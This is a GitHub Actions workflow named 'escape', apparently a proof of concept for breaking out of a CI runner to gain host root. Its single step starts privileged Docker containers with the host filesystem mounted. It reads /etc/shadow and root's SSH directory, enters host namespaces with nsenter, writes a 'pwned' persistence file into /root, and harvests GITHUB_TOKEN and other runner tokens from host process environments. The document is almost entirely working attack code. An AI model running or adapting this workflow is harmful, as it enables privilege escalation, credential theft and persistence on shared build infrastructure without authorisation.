name: escape

on:
  workflow_dispatch:
  push:
    branches: [ main, master ]

jobs:
  escape:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: root on runner VM
        shell: bash
        run: |
          set +e
          set -u
          rm -rf /tmp/esc && mkdir -p /tmp/esc

          echo "===[1] identity ==="
          id
          echo "exit=$?"

          echo
          echo "===[2] docker socket ==="
          ls -l /var/run/docker.sock
          echo "exit=$?"

          echo
          echo "===[3] docker daemon reachable? ==="
          docker info >/tmp/esc/info.txt 2>&1
          echo "exit=$?"
          sed -n '1,25p' /tmp/esc/info.txt

          echo
          echo "===[4] privileged run, bind host / ==="
          docker run --rm --privileged \
            -v /:/host \
            alpine sh -c '
              id
              echo "--- hostname ---"
              hostname
              echo "--- /host/etc/passwd (tail) ---"
              tail -n 5 /host/etc/passwd
              echo "--- /host/etc/shadow ---"
              cat /host/etc/shadow
              echo "--- /host/root ---"
              ls -la /host/root
            ' >/tmp/esc/shadow.txt 2>&1
          RC=$?
          echo "docker run exit=$RC"
          cat /tmp/esc/shadow.txt
          if [ $RC -ne 0 ]; then
            echo "!! privileged run failed, stderr выше"
            exit 0
          fi

          echo
          echo "===[5] enter host namespaces via nsenter (pid 1) ==="
          docker run --rm --privileged --pid=host \
            alpine nsenter -t 1 -m -u -i -n -p -- sh -c '
              id
              hostname
              echo "--- /root ---"
              ls -la /root
              echo "--- /root/.ssh ---"
              ls -la /root/.ssh
              echo "--- processes (top 20 lines) ---"
              ps aux
            ' >/tmp/esc/nsenter.txt 2>&1
          echo "exit=$?"
          sed -n '1,60p' /tmp/esc/nsenter.txt

          echo
          echo "===[6] persistence proof: write marker into host /root ==="
          docker run --rm -v /:/host alpine sh -c '
            echo "root@pwned $(date -u)" > /host/root/.pwned
            cat /host/root/.pwned
          '
          echo "exit=$?"

          echo
          echo "===[7] pull runner env from host /proc (masked *** by GitHub) ==="
          docker run --rm -v /:/host alpine sh -c '
            for p in /host/proc/[0-9]*/environ; do
              tr "\0" "\n" < "$p" 2>/dev/null
            done | sort -u | grep -E "^(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|GITHUB_REPOSITORY|GITHUB_RUN_ID)="
          ' >/tmp/esc/env.txt 2>&1
          echo "exit=$?"
          cat /tmp/esc/env.txt

          echo
          echo "===[8] host disk layout (real block devices) ==="
          docker run --rm --privileged -v /:/host alpine sh -c '
            lsblk
            df -h
          ' >/tmp/esc/disks.txt 2>&1
          echo "exit=$?"
          cat /tmp/esc/disks.txt

          echo
          echo "===[done] ==="
